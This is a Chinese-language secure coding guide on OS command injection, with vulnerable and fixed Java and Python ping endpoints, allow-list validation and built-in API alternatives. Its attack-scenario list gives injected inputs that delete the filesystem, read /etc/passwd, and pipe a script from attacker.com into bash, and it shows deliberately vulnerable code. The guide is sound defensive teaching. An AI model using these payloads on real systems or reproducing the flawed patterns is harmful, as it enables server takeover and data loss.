# 防范 OS 命令执行安全编码规范

## 什么是 OS 命令执行

OS 命令执行（OS Command Injection）是指攻击者通过在用户输入中注入 Shell 特殊字符（如 `;`、`|`、`&&`、`` ` ``、`$()`），使应用程序在执行系统命令时附带执行了攻击者构造的恶意命令，从而在服务器上执行任意操作系统命令，导致服务器被完全控制。

**典型攻击场景**：
- 文件处理接口：`filename=report.pdf; rm -rf /`
- 网络诊断接口：`host=127.0.0.1 && cat /etc/passwd`
- 图片转换接口：`input=image.jpg | curl http://attacker.com/shell.sh | bash`

---

## 漏洞示例（禁止使用）

### 将用户输入拼接进 Shell 命令（危险）

```java
// ❌ 危险：使用 Runtime.exec(String) 拼接用户输入
@GetMapping("/ping")
public String ping(@RequestParam String host) throws IOException {
    String command = "ping -c 4 " + host; 
    Process process = Runtime.getRuntime().exec(command);
    return IOUtils.toString(process.getInputStream(), StandardCharsets.UTF_8);
}
```

```python
# ❌ 危险：使用 shell=True 并拼接用户输入
import subprocess

@app.route('/ping')
def ping():
    host = request.args.get('host')
    result = subprocess.run(f"ping -c 4 {host}", shell=True, capture_output=True, text=True)
    return result.stdout
```

```java
// ❌ 危险：使用 ProcessBuilder 但仍然通过 shell 执行
ProcessBuilder pb = new ProcessBuilder("sh", "-c", "ping -c 4 " + host);
```

---

## 安全编码示例（推荐）

### 使用参数数组方式执行命令，避免经过 Shell 解析

将命令和参数分开传入，不经过 Shell 解析，Shell 特殊字符将被视为普通字符串，无法注入。

```java
// ✅ 安全：使用参数数组，命令和参数分离，不经过 Shell 解析
@GetMapping("/ping")
public String ping(@RequestParam String host) throws IOException {
    // 参数以数组形式传入，host 中的特殊字符不会被 Shell 解释
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
    pb.redirectErrorStream(true);
    Process process = pb.start();
    return IOUtils.toString(process.getInputStream(), StandardCharsets.UTF_8);
}
```

```python
# ✅ 安全：使用列表传参，设置 shell=False（默认值）
import subprocess

@app.route('/ping')
def ping():
    host = request.args.get('host')
    result = subprocess.run(
        ["ping", "-c", "4", host],  # 参数列表，不经过 Shell 解析
        shell=False,
        capture_output=True,
        text=True,
        timeout=10
    )
    return result.stdout
```

### 对用户输入进行白名单校验

在执行命令前，对用户输入的参数进行严格的白名单或格式校验，拒绝包含特殊字符的输入。

```java
// ✅ 安全：白名单校验 host 格式（仅允许合法 IP 或域名）
private static final Pattern SAFE_HOST_PATTERN = Pattern.compile("^[a-zA-Z0-9.\\-]{1,253}$");

@GetMapping("/ping")
public String ping(@RequestParam String host) throws IOException {
    if (!SAFE_HOST_PATTERN.matcher(host).matches()) {
        throw new IllegalArgumentException("非法的 host 格式: " + host);
    }
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
    pb.redirectErrorStream(true);
    Process process = pb.start();
    return IOUtils.toString(process.getInputStream(), StandardCharsets.UTF_8);
}
```

```python
# ✅ 安全：正则白名单校验输入格式
import re
import subprocess

SAFE_HOST_PATTERN = re.compile(r'^[a-zA-Z0-9.\-]{1,253}$')

@app.route('/ping')
def ping():
    host = request.args.get('host')
    if not SAFE_HOST_PATTERN.match(host):
        raise ValueError(f"非法的 host 格式: {host}")
    result = subprocess.run(["ping", "-c", "4", host], shell=False, capture_output=True, text=True, timeout=10)
    return result.stdout
```

### 避免直接调用系统命令，优先使用语言内置 API

许多场景下，可以用语言内置的库替代 Shell 命令调用，从根本上消除注入风险。

```python
# ✅ 安全：使用 Python 内置库替代 Shell 命令
import os
import shutil

# 替代 "rm -rf /tmp/workdir"
shutil.rmtree('/tmp/workdir', ignore_errors=True)

# 替代 "cp src dest"
shutil.copy2(src_path, dest_path)

# 替代 "mkdir -p /tmp/newdir"
os.makedirs('/tmp/newdir', exist_ok=True)
```

---
